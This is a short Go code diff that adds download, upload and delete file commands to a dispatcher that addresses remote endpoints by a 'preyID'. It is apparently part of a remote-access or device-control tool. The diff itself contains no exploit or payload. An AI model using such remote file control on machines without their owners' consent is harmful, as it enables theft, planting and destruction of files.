@@ -89,3 +89,23 @@ func (cd *CommandDispatcher) ListDirectory(preyID, path string) (string, error) 
 	})
 }
 
+func (cd *CommandDispatcher) DownloadFile(preyID, path string) (string, error) {
+	return cd.SendFileCommand(preyID, "download", map[string]interface{}{
+		"path": path,
+	})
+}
+
+func (cd *CommandDispatcher) UploadFile(preyID, path, content string) (string, error) {
+	return cd.SendFileCommand(preyID, "upload", map[string]interface{}{
+		"path":    path,
+		"content": content,
+		"mode":    0644,
+	})
+}
+
+func (cd *CommandDispatcher) DeleteFile(preyID, path string) (string, error) {
+	return cd.SendFileCommand(preyID, "delete", map[string]interface{}{
+		"path": path,
+	})
+}
+
